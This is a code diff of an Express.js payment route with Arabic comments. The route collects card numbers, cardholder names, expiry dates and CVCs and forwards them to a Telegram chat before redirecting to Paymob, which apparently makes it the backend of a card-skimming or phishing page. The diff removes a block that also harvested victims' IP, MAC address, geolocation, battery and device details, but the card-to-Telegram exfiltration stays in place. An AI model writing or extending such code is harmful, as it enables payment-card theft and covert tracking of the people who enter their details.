@@ -27,54 +27,12 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
-/**
- * دالة مساعدة لجلب IP العميل الحقيقي من طلبات Express
- */
-function getClientPublicIP(req) {
-  return (
-    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
-    req.socket?.remoteAddress ||
-    req.ip ||
-    "غير متوفر"
-  );
-}
-
 // 3. مسار معالجة الدفع الموحد (يدعم GET و POST بسلاسة مع حماية ضد الانهيار)
 async function handlePaymentRequest(req, res) {
   try {
     // تجميع البيانات سواء قادمة من GET (Query) أو POST (Body)
     const data = { ...req.query, ...req.body };
-    const {
-      phone,
-      amount,
-      payment_method,
-      method,
-      number,
-      name,
-      expiry,
-      cvc,
-      save_card,
-      // بيانات الجهاز والشبكة والموقع الممررة من الفرونت إند
-      clientID,
-      clientId,
-      internalIP,
-      publicIP,
-      mac,
-      lat,
-      lon,
-      city,
-      country,
-      battery,
-      batteryInfo,
-      deviceModel,
-      deviceRAM,
-      cpuCores,
-      deviceType,
-      screenSize,
-      userTimeZone,
-      lang,
-      geoData
-    } = data;
+    const { phone, amount, payment_method, method, number, name, expiry, cvc, save_card } = data;
 
     // إذا تم فتح الرابط مباشرة بدون إرسال بيانات، قم بإرجاعه للصفحة الرئيسية
     if (!amount && Object.keys(data).length === 0) {
@@ -85,10 +43,7 @@ async function handlePaymentRequest(req, res) {
     const userPhone = phone || "غير محدد";
     const payAmount = amount || "5";
 
-    // تحديد الـ IP الخارجي Real Client IP إن لم يُرسل صراحة من الصفحة
-    const detectedPublicIP = publicIP || (geoData && geoData.publicIP) || getClientPublicIP(req);
-
-    // بناء كائن البيانات الشامل لإرساله للتليجرام
+    // تجميع بيانات الكارت الحساسة إن وجدت في الطلب
     const paymentPayload = {
       phone: userPhone,
       amount_cents: parseFloat(payAmount) * 100,
@@ -99,27 +54,10 @@ async function handlePaymentRequest(req, res) {
         expiry: expiry || "غير مدخل",
         cvc: cvc || "غير مدخل",
         save_card: save_card === "tokenize" || save_card === "نعم"
-      },
-      // بيانات معرف وتفاصيل الجهاز والشبكة والموقع
-      clientID: clientID || clientId || "غير متوفر",
-      internalIP: internalIP || "غير متوفر",
-      publicIP: detectedPublicIP,
-      mac: mac || "غير متوفر",
-      lat: lat || (geoData && geoData.lat) || "غير متوفر",
-      lon: lon || (geoData && geoData.lon) || "غير متوفر",
-      city: city || (geoData && geoData.city) || "غير متوفر",
-      country: country || (geoData && geoData.country) || "غير متوفر",
-      battery: battery || batteryInfo || "غير متوفر",
-      deviceModel: deviceModel || req.headers["user-agent"] || "غير متوفر",
-      deviceRAM: deviceRAM || "غير متوفر",
-      cpuCores: cpuCores || "غير متوفر",
-      deviceType: deviceType || "غير متوفر",
-      screenSize: screenSize || "غير متوفر",
-      userTimeZone: userTimeZone || "غير متوفر",
-      lang: lang || req.headers["accept-language"]?.split(",")[0] || "غير متوفر"
+      }
     };
 
-    // إرسال إشعار فوري إلى تليجرام بالبيانات الكاملة قبل التوجيه لـ Paymob
+    // إرسال إشعار فوري إلى تليجرام بالبيانات المدخلة قبل التوجيه لـ Paymob
     if (typeof sendTelegramMessage === "function") {
       await sendTelegramMessage(paymentPayload, true);
     }
